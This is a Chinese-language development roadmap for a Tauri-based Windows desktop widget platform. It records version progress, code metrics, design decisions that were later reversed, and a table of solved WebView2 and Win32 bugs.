# 路线图

这份文件不只记"还要做什么"。它记三件事：

1. **走到了哪** —— 进度总览、当前规模
2. **哪些决定被现实推翻过** —— 每次想"这个方案显然更好"之前，先翻这一节
3. **踩过的坑** —— 一行一条，症状 / 真实原因 / 解法

第 2 节比第 1 节重要。待办会变，被推翻的理由不会。

---

## 进度总览

| 版本 | 主题 | 状态 | 一句话证明 |
| --- | --- | --- | --- |
| v0.1 | 骨架 | ✅ 完成 | 组件在沙箱里跑起来，桥与权限能验 |
| v0.2 | 真桌面 | ✅ 完成 | 组件是独立的 Win32 窗口，能拖能缩能锁，重启不丢 |
| v0.3 | 平台能力 | ✅ 完成 | 调度器、系统指标、落盘备份、关闭撤销、CSP 锁定、出网闸门、每实例配置、网络白名单代理、托盘/自启、目录监听、崩溃隔离、双屏边界夹紧全部落地 |
| v0.4 | 开发体验 | ✅ 完成 | SDK、脚手架、打包工具、媒体控制、调试面板 |
| v0.5 | 分发 | ✅ 完成 | 目录是一份静态 JSON：装、更新、回滚、举报、新权限复核全部落地 |
| v0.6 | 生态 | 🟡 进行中 | 目录上线（Pages 已开）+ 目录缓存/断网兜底落地；剩首次引导、多源列表、真机验收 |
| v0.7 | 交付 | 🟡 进行中 | NSIS 安装包 + 自动更新（见 v0.7 一节） |
| v0.8 | Agent 接入 | 🟡 进行中 | 默认关的回环端点：只绑 127.0.0.1、令牌、审计日志、8 个白名单动作（读日志用 `npm run agent -- state`）；还差一次 CLI 往返的真机验收 |
| v0.9 | 声音与链接 | ✅ 完成 | `lattice.music` 改名 + 播放器名翻人话、`audio:level`、`lattice.bookmarks`、`shell:open` |
| v0.10 | 内置 assistant | 🟡 进行中 | 自备 OpenAI 兼容模型与 key（**key 只在 Rust 里**）、工具调用走同一套 8 个动作、组件那侧只有 `llm:chat`；桌面上是一个能拖的独立小窗（Ctrl+K），真厂商 key 的往返已走通；平台界面中英双语（英文原句当 key，缺翻译退化成英文），**组件作者写的字也是双语**（清单里写 `{ zh, en }`，HTML 里自己读 `lang.get`） |

**当前规模**（截至本次改动，2026-10-25）：

| 指标 | 数值 | 备注 |
| --- | --- | --- |
| 前端 TS/TSX | 14 471 行 | 平台外壳 + 运行时 + 商店面板 + 调试面板 + assistant 抽屉与小窗 + agent 执行器 + 中英文案表 + 作者文案的双语归一化 |
| 样式 CSS | 3 746 行 | 纯手写，无 UI 库 |
| Rust | 13 145 行 | 窗口、协议、落盘、壁纸采样、指标采样、诊断、单实例、CSP、出网闸门、托盘、自启、目录监听、崩溃守卫、网络代理、媒体会话、声音回环、打开外链、包解压、验签、备份与回滚、商店命令、遮挡轮询、参考线叠层、agent 端点、LLM 客户端与策略、assistant 小窗 |
| 组件 SDK | 724 行 | 零依赖 ES module + 类型声明（`lattice.js` + `lattice.d.ts`） |
| 官方组件 + 示例 | 13 758 行 | 14 个官方包 + 1 个示例（示例里那份 SDK 副本也算在内；未跟踪的桌宠不计） |
| 构建脚本 | 2 397 行 | 组件索引、脚手架、打包、签名、商店索引、SDK 同步、tauri 包装、注入 + 单测、agent CLI + 客户端测试 |
| 浏览器断言 | 1709 条 | 40 个自检页，跑一遍的真实计数（0 failed） |
| Node 断言 | 25 条 | 注入规则 9 条 + SDK 副本一致性 2 条 + agent CLI 14 条，都不依赖 dev server |
| Rust 单测 | 178 条 | 157 条纯逻辑用 `rustc --test` 壳子跑得动（今天全过，含 `llm_policy` 的 21 条），21 条要 `cargo test`（本机跑不了），见 AGENTS §11 |
| Tauri 命令 | 60 个 | |
| 权限 | 10 项全可用 | `media:control` 在 v0.4、`agent:activity` 在 v0.8、`audio:level` / `shell:open` 在 v0.9、`llm:chat` 在 v0.10 补齐 |
| 踩过的坑 | 72 条 | 见 v0.2 文末那张表 |

---

## 迭代时间线

一天之内，从"骨架"到"真的贴在桌面上"。

| 时间 | 提交 | 做了什么 | 规模（TS / Rust / CSS） |
| --- | --- | --- | --- |
| 02:40 | `b6fbbf8` | 骨架：清单、注册表、沙箱桥、权限闸门、画布、Win32 初版 | 1 268 / 358 / 548 |
| 09:35 | `abd20c0` | 改成**零内置**：官方包也必须显式安装 | 1 477 / 358 / 631 |
| 09:54 | `fb2a1b6` | 第一个能跑的 demo：官方组件包、就地授权 | 1 553 / 358 / 680 |
| 11:22 | `b8fbc95` | 组件真的贴到桌面：每个 Placement 一个窗口 | 1 782 / **712** / 680 |
| 11:25 | `bbdc893` | 修：投放后组件被推到屏幕外（`screenX` 哨兵值） | — |
| 11:27 | `ed269c5` | 实机截图进文档 | — |
| 12:31 | `250ab45` | 窗饰（拖 / 层级 / 别针 / 收回）+ 状态落盘 | 2 282 / **1 123** / 868 |
| 23:50 | `f2f132f` | 用户组件协议、可输入、存储广播、边界夹紧、设置菜单 | **3 216** / **1 649** / **1 757** |
| 次日 02:00 | `d022d62` | 待办修好（`allow-forms` + 窗饰让位）、两侧面板可收起、组件图标 | 3 433 / 1 649 / 1 834 |
| 11:22 | `91c09ca` | 底板可调：截壁纸 + CSS blur、字色翻转、属性面板三条滑杆 | 4 052 / **1 949** / **2 016** |
| 12:40 | `00299c6` | 待办优先级圆点（红 / 黄 / 绿） | 4 052 / 1 949 / 2 045 |
| 14:05 | _本次_ | 兜底页 + 错误上报 + 重载：组件坏了能看出来 | **4 383** / **2 504** / **2 215** |

数字里能看到三处台阶：

- **11:22 Rust 358 → 712**：窗口层落地。之前所有窗口代码都是"写了但没接进流程"。
- **12:31 Rust 712 → 1 123**：窗饰回传 + 文件落盘。落盘这一项看着简单，实际是 400 行——因为要和"用户正在拖窗口"抢时序。
- **之后 Rust 1 123 → 1 949**：自定义协议 + 键级存储 + 窗口守卫 + 壁纸采样。这一批几乎全是"被逼出来的"。

前端那 900 多行的涨幅九成在 CSS：UI 从"能用"变成"能看"，顺便把图标从 emoji 换成了内联 SVG（emoji 在不同 DPI 下粗细不一致，且没法跟随主题色）。

---

## 被推翻的九个决定

这一节是这份文档的核心。每条都写着**当初为什么这么选**、**什么把它撞翻了**、**现在怎么做**、**付出了什么代价**。

7 个里，**五个是环境撞出来的**（显卡拿不到合成、WebView2 不落盘、Tauri 同步命令占主线程、Windows 激活时改 z 序、系统磨砂的半径写死），**两个是自己图省事埋的**（宿主页自己拼地址、每个实例各缓存一份数据）。第 8 个不一样：它是我把"平台"当"工具"设计错了。第 9 个更不像"环境"：那是**我把一条正确的结论套错了对象** —— "组件不该自带模型"被读成了"平台不该有模型"。

没有一个是"架构不够优雅"。这也解释了为什么坑表比待办清单长：真正拦住你的往往不是设计，而是你没预料到的那台机器。

### 1. 逐像素透明 → 不透明窗口 + 圆角裁剪

- **当初**：`transparent(true)` + `DwmEnableBlurBehindWindow`，指望组件像贴纸一样浮在壁纸上，形状完全自由。
- **撞墙**：逐像素透明要求 WebView2 走 DirectComposition。这台机器 GPU 进程起不来（混合显卡 + 虚拟显示适配器），软件渲染下拿不到 alpha 通道，卡片永远是白的。试过 `--disable-gpu-compositing`，窗口直接建不出来（`HRESULT 0x8007139F`）。
- **现在**：窗口不透明，**宿主页自己画卡片**（底色 + 1px 内描边），`SetWindowRgn` + `CreateRoundRectRgn` 把外形裁成 12px 圆角。缩放时重新裁一次。
- **代价**：圆角弧线外侧那几个像素不属于窗口，缩放手柄必须往里让 18px（Windows 自己的窗口也一样）；异形窗口、投影、模糊背景暂时都做不了。

### 2. `localStorage` → 文件

- **当初**：Zustand 的 `persist` 默认走 `localStorage`，一行配置就完事。
- **撞墙**：这台机器 WebView2 的 `localStorage` 全在内存里。`EBWebView/Default/Local Storage` 从来没被创建过——页面内写入后读回正常，**磁盘上就是没有**，优雅退出也一样。重启布局全丢，对桌面平台是硬伤。
- **现在**：`StateStorage` 换成 Tauri 命令，写 `state.json`（临时文件 + 原子替换）；组件私有存储同样落文件。顺带把存储接口从"整块覆盖"改成**键级原子写**（`widget_store_update`，进程内锁内读-改-写）。
- **代价**：每次读写都要过 IPC；`store.ts` 里必须先立一道 `hydrated` 闸门，否则异步水合完成前任何一次 set 都会把空状态盖到磁盘上。

### 3. 一律"点了不打扰" → 按 `interactive` 分流 + 底层守卫

- **当初**：所有桌面窗口都 `WS_EX_NOACTIVATE`，还挂进 WorkerW 当桌面的子窗口。追求"绝不抢焦点"。
- **撞墙**：便签、待办打不了字——键盘焦点根本进不来。但去掉 `NOACTIVATE` 之后，点一下它就窜到浏览器前面，切走又掉回桌面，**一进一出就是"闪来闪去"**。
- **现在**：清单加 `interactive`（默认 `true`）：不挂 WorkerW、去掉 `NOACTIVATE`、压到 `HWND_BOTTOM`，再子类化拦 `WM_WINDOWPOSCHANGING`，给"往上提"的请求补 `SWP_NOZORDER` —— 激活照给，z 序原地不动。
- **代价**：多一层守卫，而且**守卫是"开关 + 子类化"两件事**：开关是窗口属性（任意线程可翻），子类化只能回窗口线程装（`SetWindowSubclass` 跨线程会静默返回 0，不报错）。切"置顶"前必须先翻开关，否则那一下 `HWND_TOPMOST` 会被守卫吃掉。

### 4. 宿主页自己拼入口地址 → 一处算绝对地址 + 自定义协议

- **当初**：宿主页 `base + entry` 拼 iframe 的 `src`。bundled 组件的资源就在前端目录里，够用。
- **撞墙**：用户组件的文件在 `%APPDATA%`，前端资源里没有，`/widgets/<id>/...` 这条路径够不到。组件"装了但打不开"，卡片写着"待接入"。
- **现在**：`registry.ts::resolveEntryUrl` 一处算出绝对地址，`buildSpecs` 原样透传；`protocol.rs` 提供 `lattice-widget` 协议，把 `%APPDATA%` 下的组件当静态站点发。路径穿越在**百分号解码之后**判断，未知 MIME 一律按二进制发。
- **代价**：Windows / Android 上自定义 scheme 必须写成 `http://lattice-widget.localhost/`，写成 `lattice-widget://localhost/` 连请求都发不出去（不报错，只是白屏）；iframe 是 opaque 源，响应必须带 `Access-Control-Allow-Origin: *`，否则组件 `fetch` 自己的 json 会被当跨域拦掉。

### 5. 每个实例缓存一份存储 → 读不缓存 + 落盘后广播

- **当初**：桥里持有一份 `storeCache`，省 IPC。组件读自己数据不必每次都过 Rust。
- **撞墙**：画布一个实例、桌面一个实例，各持一份内存列表。A 加完 B 还停在旧列表，B 随便动一下就整块写回去——用户看到的是**"加了几条待办，回头只剩一条"**。
- **现在**：读不缓存；写走 `widget_store_update` 做键级合并；每次落盘后 Rust 广播 `lattice:widget-store`，两个宿主转成 `store-changed` 推给 iframe，组件收到重读（自己的写入还在飞时推迟到落地）。
- **代价**：读写都要 IPC；**每个用 `storage` 的组件都必须处理这条推送**，不处理就是"多实例必丢数据"。这条已写进 `WIDGET_SPEC`。

### 6. 自己维护窗口表 → 交给 Tauri 的注册表

- **当初**：`Mutex<HashMap<label, WebviewWindow>>` 自己管窗口，看起来最直接。
- **撞墙**：建窗口时新窗口的宿主页立刻回调 `widget_host_config` 来抢同一把锁 —— 死锁，表现为 `HRESULT 0x8007139F`。同一类错误还有一次：**Tauri 2 的同步命令跑在主线程**，而 `build()` 要把建窗口的活投递回主线程再等结果，命令占着主线程等自己，界面直接冻住、日志停在 `sync specs=N`。
- **现在**：窗口存在性问 `app.get_webview_window`，不自己记账；Runner 只存极轻的 `HostConfig`，且必须在 `build()` **之前**写入；所有建窗口的命令都是 `async fn`，落到运行时线程池。
- **代价**：不能在"建窗口过程中"读窗口状态；`HostConfig` 的登记顺序成了隐式契约，改动这块要先看 AGENTS.md §5。

### 7. 系统 acrylic → 自己截壁纸 + CSS `filter: blur()`

- **当初**：底板要能调模糊、浓度、颜色，最省事的做法是调系统：`SetWindowCompositionAttribute`（ACCENT_ENABLE_ACRYLICBLURBEHIND）或者 Win11 的 `DWMWA_SYSTEMBACKDROP_TYPE`。一行 API，真·磨砂，透出的是**压在这个窗口后面的所有东西**。
- **撞墙**：系统的模糊半径是 OS 定的，**没有参数**。用户要的是一条连续滑杆，从 0 拖到 40 —— 这条路给不了。而且 `ACCENT_ENABLE_ACRYLICBLURBEHIND` 在 Win11 22H2 之后还有已知的拖动掉帧。
- **现在**：`wallpaper.rs` 用 `PrintWindow(Progman, PW_RENDERFULLCONTENT)` 把桌面层（壁纸 + 图标，**不含任何窗口**）截成一张位图，按窗口位置裁一块传给宿主页；宿主页把它铺成 `<canvas>`，用 CSS `filter: blur(Npx)` 糊，再叠一层 `rgba(tint, alpha)` 的底色。这就是 acrylic 的配方，只是把"系统负责的那一步"自己做了。
- **代价**：透出来的是**壁纸**，不是"后面的浏览器窗口"。这是这个方案的边界，写进了 WIDGET_SPEC §2.2。另外：`PrintWindow(GetDesktopWindow())` 返回全黑（必须用 `Progman`），`BitBlt(GetDC(NULL))` 会把组件自己一起截进去（不能用）；截一张双屏 3456×1081 约 24ms，所以 IPC 带 `2s` 缓存、只在窗口挪动/改尺寸/拖滑杆时重截；壁纸幻灯片和 Wallpaper Engine 这类动态壁纸最多滞后 2 秒。

### 8. 重启回到设计态 → 记住运行态

- **当初**：`desktopMode` 刻意不持久化，重启一律回到画布。理由是"先让人看见设计态"，别一开机就满屏组件。
- **撞墙**：这不是一个设计工具，是一个**桌面组件平台**。用户摆好便签和待办、关掉主窗口、第二天开电脑 —— 组件不见了，得重新投放一遍。天天如此。而"开机就有一堆窗口"这个担心，其实一条开关就能解决。
- **现在**：`desktopMode` 落盘，启动时（水合完成 + 清单读到之后）重建窗口；设置里给一条 `Restore on launch`，不想要就关掉。刻意**不**在恢复时最小化主窗口 —— 开机就把窗口藏起来，用户会以为应用没打开。
- **代价**：多一个需要保持"磁盘状态 = 屏幕状态"的字段；恢复路径必须等两件事就绪（水合、清单），否则会用空列表同步一次，把所有窗口关掉。

**一条总结**：这八个都不是"架构错了"，是"环境比文档狠"，外加一条"把平台当工具设计"。所以每次撞墙之后，除了改代码，还往坑表补一行——那 50 行就是这台机器教我的东西。

### 9. "agent 只给嘴不给手" → 平台自己带模型 + 八个工具

- **当初**：`docs/AGENT_ACCESS.md` §3.1 明确写了**不做聊天窗、不带模型**，三条理由都成立：组件的配置里要存 API key（落到 `widget-store`）、要给组件开 `network` 而主机白名单是给固定域名的、**有嘴就有手**（能发请求的组件离"能改布局"只差一条桥方法）。
- **撞墙**：那三条是**"组件当 agent"**的结论，被我套到了**"平台当 agent"**上。用户真正要的是"在我的桌面里跟模型说话，它替我把桌面摆好" —— 而不是去外面开一个 Claude Desktop 再连进来。而在平台侧，三条理由都不成立：
  - key 不进组件：它落在 `assistant.json`，由 Rust 读、由 Rust 发（前端只见掩码）；
  - 不用给组件开 `network`：请求走 Rust 的 WinHTTP，组件文档的 `connect-src` 一行没改；
  - 手就是**已有的那八个**白名单动作：外部 agent 端点早就有它们，而且每一步都可撤销。
- **现在**：`llm.rs`（传输 + key）→ `llm_policy.rs`（协议、上限、错误翻译，21 条 `rustc --test`，**不依赖任何 crate**）→ `runtime/assistant.ts`（工具 schema / 系统提示 / 历史裁剪 / 快照预算）→ `platform/assistant.ts`（工具循环，复用 `runAgentAction`）→ `AssistantPanel.tsx`（Ctrl+K）。组件那条路是 `llm.chat`：**不带工具**，权限 `llm:chat`，默认拒。
- **代价**：多一项"会花用户钱"的权限（授权文案得说人话）；多一个真网络出口（收窄到 http/https、明文 http 只许本机、不跟随重定向、300ms 节流、512KB 响应上限）；多一类"模型说错话"的错误面 —— 靠 `llm_policy::describe_status` 把 401 / 404 / 429 翻成人话，而不是统一说"检查你的网络"（那正是更新器踩过的坑）。

---

## v0.1 —— 骨架（已完成）

目标是把最贵的三个决定定死：组件包格式、桥协议、权限模型。

- [x] Tauri 2 + React 19 + TS 工程骨架
- [x] 组件清单校验与归一化（`runtime/manifest.ts`）
- [x] 组件注册表：内置（index.json）+ 用户安装（Rust 扫描）
- [x] 沙箱 iframe 运行时 + 来源校验的 RPC 桥
- [x] 权限闸门与逐项授予 UI
- [x] 画布：拖动、缩放、网格吸附、层级标记、鼠标穿透开关
- [x] Win32：`WS_EX_NOACTIVATE` / `WS_EX_TOOLWINDOW` / 穿透 / WorkerW 挂载 / 置顶
- [x] 组件包安装与卸载（Rust 命令，含 id 合法性校验）
- [x] 两个可运行的示例组件：时钟、待办
- [x] 明暗主题与主题令牌下发

## v0.2 —— 真桌面（已完成）

从"画布上的预览"变成"真的贴在桌面上"。

- [x] **每个组件一个 WebviewWindow** —— 由 Placement 派生真实窗口，主窗口最小化退场
- [x] **层级实机接入** —— `desktop.rs` 的 `apply_window_layer` 已接进窗口创建流程
- [x] **圆角** —— `SetWindowRgn` 把窗口裁成圆角矩形（见"被推翻的决定"第 1 条）
- [x] **桌面窗口的窗饰** —— 右上角四个功能图标（拖动 / 层级 / 别针 / 收回）+ 八向缩放手柄，全部由宿主页 `widgetHost.ts` 自绘，组件不参与
- [x] **别针锁定** —— `placement.pinned` 落到 Win32 之外的一层：锁住后拖拽与缩放手柄整体禁用，光标也跟着变
- [x] **位置与尺寸回写** —— 松手时把窗口矩形报回主窗口，存进 `desktopRects`，下次投放优先用它
- [x] **状态落盘** —— 平台状态与组件私有存储都写文件（`%APPDATA%\com.iron-tom.lattice`），重启不丢
- [x] **主题热更新** —— 平台切明暗时广播给所有桌面窗口，不用重开
- [x] **桌面组件可输入** —— 清单 `interactive` 分流：要写字的组件不挂 WorkerW、能拿键盘焦点，靠底层守卫压住 z 序
- [x] **属性面板改尺寸** —— 宽/高精确输入 + 恢复默认，同时写画布与桌面矩形
- [x] **组件存储跨实例同步** —— 每次落盘后广播 `lattice:widget-store`，同一组件的画布实例与桌面实例自动重读，不再互相覆盖
- [x] **窗口位置兜底** —— 拖动与缩放都以右上角那颗按钮为锚点夹回显示器工作区，拖到屏幕外也能拖回来
- [x] **`lattice-widget://` 自定义协议** —— 用户安装的组件从 `%APPDATA%` 直接加载，路径穿越与 id 校验都在协议层
- [x] **安装链路** —— 把组件文件夹拖进窗口即安装（`install_widget` 先删后拷 + webview 拖放事件），组件库标题栏可直达组件目录
- [x] **设置菜单** —— 顶栏头像（`Ctrl+,`）唤出：本机档案、外观、网格吸附、关于
- [x] **图标集** —— 内联 SVG 取代 emoji，随主题上色，不再受 DPI 影响
- [x] **界面文案统一英文** —— 平台、组件、错误提示、窗口标题全英文；代码注释与文档保持中文，README 分英文版与中文版（`README.zh-CN.md`）
- [x] **待办清单能用回车了** —— 沙箱补上 `allow-forms`（少这一位，`<form>` 提交被整条拦掉，回车静默失效）；顶部加 22px 标题栏把右上角窗饰让出去；`tests/todo-add.html` 12 条断言钉住加/勾/删/计数与"没有 `allow-forms` 就 0 次写盘"
- [x] **两侧面板可收起** —— 组件库与属性面板各一颗开合按钮（圆角方框 + 内侧竖杠，右侧镜像），收起后退成 40px 竖条，画布从 664px 长到 1184px；状态持久化，列宽带过渡
- [x] **组件图标** —— 清单新增 `icon` 字段，平台拿 SVG 当遮罩、用 `currentColor` 上色（明暗主题自动对，彩色图标压成剪影）；内置四个组件各配一枚 16×16 图标，没声明的包退回"名字首字"
- [x] **便签正文不再被窗饰压住** —— 正文原来从 10px 就起排，桌面窗口右上角那排图标（97×28）正好盖住第一行；现在顶上是一条 24px 状态条（保存状态从底栏挪上来，不再是空带），正文从 40px 起排。`tests/note-layout.html` 7 条断言直接量正文起点与安全区宽度
- [x] **底板可调** —— 颜色（色块 + R/G/B 三条滑杆）/ 浓度（`Fill`，0–1）/ 磨砂（`Blur`，0–40px）三条连续滑杆，属性面板里按实例调，清单里给出厂值。`wallpaper.rs` 截桌面层、宿主页三层叠（壁纸 canvas + 底色 veil + iframe）；字色与强调色按合成亮度自动翻转；`Appearance` 随 `sync_widget_windows` 走，拖滑杆 120ms 内跟手，不重建窗口（见"被推翻的决定"第 7 条）。`tests/appearance.html` 31 条断言钉住归一化（非法值退回出厂、范围夹紧、`#abc` 摊开）与合成色/亮度阈值
- [x] **待办优先级** —— 每行左边一颗圆点，红 / 黄 / 绿三档，点一下循环一档，第四下回到"没设"（空心圈，hover 才变清楚）。老数据没有这个字段就当没设；点圆点不会顺手勾掉那一条。颜色写死成中间调，不走主题令牌 —— 红黄绿是语义色，中间调在深色卡片和浅色底板上都压得住。视觉 10px、可点区域用 `::after` 撑到 18px。`tests/todo-add.html` 场景 7 九条断言钉住载入、循环顺序、不误勾、每档落盘、以及 `aria-label` 说清了"点一下会变成什么"
- [x] **待办拖动排序** —— 整行都能拖起来换位，不用先找一个"手柄"。指针事件自己实现，不走 HTML5 拖放（沙箱是不透明源，跨文档 `dataTransfer` 靠不住）。过 4px 阈值才算拖动，抬手后浏览器补的那次 `click` 要吃掉，否则拖完那条被顺手勾掉；从圆点 / 勾选框 / 删除按钮上按下不起拖。拖到列表上下边缘自动滚，跟手位移把 `scrollTop` 一起算。`tests/todo-add.html` 场景 8 四条断言钉住换位、落盘顺序、2px 抖动仍算点击

**验收结果**（2026-10-22 实机，不是"应该能"）：

| 项 | 实测 |
| --- | --- |
| 拖动 | 指针位移 `+80,+40`，窗口从 `(30,700)` 到 `(110,740)`，分毫不差 |
| 缩放 | 右下角 `260×200 → 320×240`；右边单独 `320 → 250`；小于 `minW/minH` 会夹紧 |
| 别针 | 锁上后同样拖 80px，窗口纹丝不动；解锁立刻恢复 |
| 收回 | 窗口消失，`state.json` 里 `placements: []`、`desktopRects: {}` 同步清空 |
| 重启 | 摆放、已安装、授权、主题、便签文字、待办勾选全部从磁盘恢复 |
| 图标 | 组件库四张卡片、画布标题条、属性面板标题都成了 SVG 剪影（`getComputedStyle().maskImage` 分别指向各自的 `icon.svg`），深色浅色两套都清楚 |
| 窗饰 | 指针停在便签里（窗饰淡入）时，第一行正文完整可见；`Loaded` 改叫 `Saved` —— 这条现在常驻顶上，说的是状态，不是"刚才读了一次盘"这个事件 |
| 底板 | 白 `0.22 / blur 24` 是浅底深字、藏青 `0.60 / blur 30` 是深底浅字，两套字色都自己翻对了；不出厂外观的待办跟改动前一像素不差；拖滑杆不重启窗口，`#ff5a3c 0.55 / blur 12` 当场从深色卡片变成橙红磨砂 |
| 兜底页 | 装一个 `entry: "nope.html"` 的组件：桌面窗口显示 `File not found`、404、请求路径 `nope.html`、`LOOKED IN .../widgets/probe.missing`，不再白屏 |
| 错误卡 | 同一个组件改成第 15 行抛 `undefinedThing.value` 并挂一张不存在的图：卡片显示 `Script error`、`undefinedThing is not defined`、`index.html:15:25`、`+1`（那条资源错误），堆栈可展开 |
| 重载 | 把该组件的文件换成一份干净的，点卡片上的 `Reload`：内容变成新版本、错误卡消失 —— 说明真的重新取了文件，不是从缓存里拿的 |
| 取资源 | 组件里 `fetch("nope.json")`：`status = 404`、`body = 0 chars`、无 `content-type` —— 兜底页只给导航，没往 `fetch()` 里塞 HTML |

验收标准（已达成）：关掉主窗口后，桌面上的组件仍在，切窗口不被遮挡，点击不抢焦点。

**没做的，挪进 v0.3**：多显示器 PerMonitorV2、托盘、组件加载失败的兜底页、重启后自动把组件放回桌面。（第一条兜底页已经在 v0.3 补上了，见下。）

### 踩过的坑（都已解决，别再踩）

| 症状                                                          | 真实原因                                                                                       | 解法                                                                |
| ----------------------------------------------------------- | ------------------------------------------------------------------------------------------ | ----------------------------------------------------------------- |
| 命令里调 `sync_widget_windows` 之后界面直接冻住，日志停在 `sync specs=N`，无报错 | Tauri 2 的**同步命令跑在主线程**，而 `WebviewWindowBuilder::build()` 要把建窗口的活儿投递回主线程再等它完成 —— 命令占着主线程等自己 | 命令改成 `async fn`，落到运行时线程池                                          |
| 同上，但表现为 `WebView2 error HRESULT(0x8007139F)`                | 持有 `Mutex<窗口表>` 去建窗口，新窗口的宿主页立刻回调 `widget_host_config` 抢同一把锁                                | 不维护窗口表，窗口存在性交给 `app.get_webview_window`；宿主页配置在 `build()` **之前**登记 |
| 主窗口一片白，`eval` 返回 Ok 但脚本没跑                                   | WebView2 的 GPU 进程起不来（混合显卡 + 虚拟显示适配器）                                                       | `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS=--in-process-gpu`          |
| 加上 `--disable-gpu-compositing` 后透明窗口建不出来                    | 该开关会关掉 DirectComposition，逐像素透明依赖它                                                          | 不要加这个开关                                                           |
| 组件窗口背景永远是白的，`transparent(true)` 无效                          | 逐像素透明要求 WebView2 走合成，软件渲染下拿不到；`DwmEnableBlurBehindWindow` 也压不住                             | 放弃逐像素透明：窗口不透明、宿主页自己画卡片、`SetWindowRgn` 裁圆角                         |
| `layer: desktop` 的组件跑到了最上层                                  | `window.show()` 在 `apply_to` 之后调用，ShowWindow 会把窗口重新提到最前                                    | 先 `show()` 再应用层级                                                  |
| 投放之后组件"消失"，`GetWindowRect` 显示在 -31000 一带                   | 主窗口最小化后 `window.screenX/screenY` 变成 `-32000` 哨兵值，防抖同步拿它重算画布原点，把窗口 `set_position` 到屏幕外      | 缓存上一次可信的原点，遇到哨兵值退回缓存                                             |
| `cargo build` 报 `export ordinal too large: 92606`           | `crate-type` 里有 `cdylib`，windows-gnu 要导出巨大符号表                                              | 只留 `rlib`                                                         |
| 组件内容明明写了 `background: transparent`，桌面卡片却是一块白板        | 平台在 `:root` 上设了 `color-scheme: dark`，它会继承进 iframe 元素、变成被嵌入文档的初始 color-scheme；只要不是 `normal`，Chromium 就给 iframe 画布刷一层不透明底色 | `iframe { color-scheme: normal }`（`widgetHost.css` 与 `styles.css` 各一处） |
| 缩放手柄"点不准"，正对着窗口角点按下去会穿到桌面                    | 窗口被 `SetWindowRgn` 裁成圆角后，圆角弧线外侧那几个像素不属于窗口，鼠标事件到不了                            | 四个角的手柄放大到 18px，让弧线以内的部分也落在手柄里；这是圆角窗口的固有代价，Windows 自己的窗口也一样 |
| 重启之后布局全丢，`localStorage` 里空空如也                        | 这台机器的 WebView2 把 localStorage 全放内存里，`EBWebView/Default/Local Storage` 从没被创建过（优雅退出也一样） | 状态改为显式写文件：`state.json` + `widget-data/<组件>.json`，走原子替换          |
| `layer: desktop` 的窗口其实没挂到 WorkerW                       | 部分 Win11 版本 `Progman` 自己承载 `SHELLDLL_DefView`，`0x052C` 之后也不会派生 WorkerW 兄弟窗口，查找返回 None | 已有降级：退成 `HWND_BOTTOM`，仍在所有普通窗口之下；真挂载留给后续版本                  |
| 点「收回」之后窗口要愣几百毫秒才消失                                       | `window.close()` 要等 WebView2 把渲染进程拆完，这段时间窗口还完整地定格在屏幕上                                     | 宿主页先 `hide()` 再走 IPC 关闭，失败则 `show()` 回滚；Rust 侧三处关闭路径同样先 hide 再 close |
| 桌面上的笔记/待办点进去打不了字，连光标都没有                                     | 桌面窗口一律带 `WS_EX_NOACTIVATE`，还被挂进 WorkerW 变成桌面的子窗口 —— 两条都让键盘焦点进不来                               | 清单加 `interactive`（默认 `true`）：不挂 WorkerW、去掉 `NOACTIVATE`、压到 `HWND_BOTTOM` |
| 点一下组件，它窜到所有窗口最前面，切走又掉回桌面 —— 看着就是"闪来闪去"                          | 可激活的窗口被激活时，Windows 会顺手把它提到 z 序最前。能打字和"待在桌面层"本来是冲突的                                        | 子类化拦 `WM_WINDOWPOSCHANGING`：给"往上提"的请求加 `SWP_NOZORDER`，原地不动。激活照给，z 序不动             |
| 守卫明明加了，窗口还是往上窜                                            | `SetWindowSubclass` 跨线程调用不报错，只返回 0 —— 从同步命令的线程装守卫会静默失败                                    | 用 `window.run_on_main_thread(...)` 回到窗口线程再装                                  |
| 用户组件"装了但打不开"，卡片写着"待接入"                                 | 用户组件的文件在 `%APPDATA%` 里，前端资源里没有，`/widgets/<id>/...` 这条路径够不到它                          | 注册 `lattice-widget` 协议，把 iframe 的 src 指向 `http://lattice-widget.localhost/<id>/<相对路径>`（`protocol.rs`） |
| 自定义协议的地址在 Windows 上一直 404                                  | Windows / Android 把自定义 scheme 挂在 `http://<scheme>.localhost/`，其它平台才是 `<scheme>://localhost/` —— 写成后者在 Windows 上连请求都发不出去 | `registry.ts::widgetSchemeBase()` 按 UA 分流；协议处理器只看 `uri.path()`，不关心 host |
| 组件里 `fetch("data.json")` 被 CORS 拦掉                            | iframe 是 `sandbox="allow-scripts allow-forms"`，文档源是 opaque 的，取自己的文件在浏览器看来也算跨域                       | 协议响应统一带 `Access-Control-Allow-Origin: *`                                     || 卸载组件后顶栏计数比看得见的多一个                                     | 只删了 `installedIds`，没删 `placements`：留下一个指向不存在组件的幽灵，画不出来也点不到                            | `uninstall` 里先按 `widgetId` 清掉所有实例，再取消安装                                |
| 装完第三个组件"什么都没发生"                                        | `nextFreeSlot` 把换行线写死在 1600px，窄窗口下新组件被摆到可视区右侧，得横向滚才看得见                            | 换行位置按 `.lattice-canvas` 的实际 `clientWidth` 算                                  |
| `cargo test` 编译通过但一运行就 `0xc0000139 STATUS_ENTRYPOINT_NOT_FOUND` | 这台机器的安全策略不让往 `src-tauri/target/debug/deps/` 写新的 `.exe`（构建输出被拦，二进制是残的），跟代码无关：`cargo build` / 真机运行都正常 | 纯函数逻辑用 `#[path = "..."] mod x;` 写个壳子，`rustc --test 壳子.rs` 单独编一遍 —— 断言还是模块里那一份，不复制；换 msvc 工具链或放开目录权限后 `cargo test` 就能正常跑 |
| 组件明明在第 15 行抛错，错误卡写着 `index.html:67:25` | 往组件文档里注入的上报脚本占了几十行，而 `event.lineno` 数的是**文档里的行** —— 所有内联脚本的行号被整体推后 | 注入时把脚本压成一行（`diagnostics.rs::snippet`），文档总行数不变；外部脚本报自己的文件名行号，本来不受影响。单测直接断言"注入前后行数相等、`boom();` 还在第 8 行" |
| 组件抛了 `undefinedThing is not defined`，卡片却显示 `Failed to load img` | 错误按到达顺序覆盖：脚本先抛，紧接着 `<img>` 加载失败，后到的那条把根因盖掉了 | 按严重程度挑主错误（脚本/未决 3 > 资源 1），同级先到者胜；其余收进 `+N`，悬停能看全。`pickPrimary` 有 6 条断言 |
